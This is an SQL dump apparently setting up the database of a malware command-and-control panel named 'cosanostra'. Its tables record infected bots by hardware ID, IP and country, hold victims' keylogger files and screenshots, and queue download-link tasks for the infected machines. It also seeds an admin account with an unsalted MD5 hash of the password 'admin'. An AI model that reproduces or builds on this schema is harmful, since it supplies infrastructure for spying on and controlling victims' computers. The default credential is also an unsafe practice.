-- phpMyAdmin SQL Dump
-- version 4.2.7.1
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Feb 17, 2021 at 12:42 AM
-- Server version: 5.6.20
-- PHP Version: 5.5.15

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `cosanostra`
--

-- --------------------------------------------------------

--
-- Table structure for table `bot`
--

CREATE TABLE IF NOT EXISTS `bot` (
`ID_Bot` int(11) NOT NULL,
  `HWID` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `IP` varchar(250) COLLATE utf8_unicode_ci NOT NULL,
  `Country` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `Date_Time` varchar(250) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `keylogger`
--

CREATE TABLE IF NOT EXISTS `keylogger` (
`ID_k` int(11) NOT NULL,
  `HWID` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `File_keylog` varchar(250) COLLATE utf8_unicode_ci NOT NULL,
  `Keylog_date` varchar(150) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `screenshot`
--

CREATE TABLE IF NOT EXISTS `screenshot` (
`ID_s` int(11) NOT NULL,
  `HWID` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `File_screenshot` varchar(250) COLLATE utf8_unicode_ci NOT NULL,
  `screenshot_date` varchar(250) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `tasks`
--

CREATE TABLE IF NOT EXISTS `tasks` (
`Id_task` int(11) NOT NULL,
  `HWID` varchar(250) COLLATE utf8_unicode_ci NOT NULL,
  `link` text COLLATE utf8_unicode_ci NOT NULL,
  `completed` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE IF NOT EXISTS `users` (
  `id_user` int(11) NOT NULL,
  `username` varchar(55) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(256) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id_user`, `username`, `password`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `bot`
--
ALTER TABLE `bot`
 ADD PRIMARY KEY (`ID_Bot`);

--
-- Indexes for table `keylogger`
--
ALTER TABLE `keylogger`
 ADD PRIMARY KEY (`ID_k`);

--
-- Indexes for table `screenshot`
--
ALTER TABLE `screenshot`
 ADD PRIMARY KEY (`ID_s`);

--
-- Indexes for table `tasks`
--
ALTER TABLE `tasks`
 ADD PRIMARY KEY (`Id_task`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
 ADD PRIMARY KEY (`id_user`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `bot`
--
ALTER TABLE `bot`
MODIFY `ID_Bot` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `keylogger`
--
ALTER TABLE `keylogger`
MODIFY `ID_k` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `screenshot`
--
ALTER TABLE `screenshot`
MODIFY `ID_s` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT for table `tasks`
--
ALTER TABLE `tasks`
MODIFY `Id_task` int(11) NOT NULL AUTO_INCREMENT;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
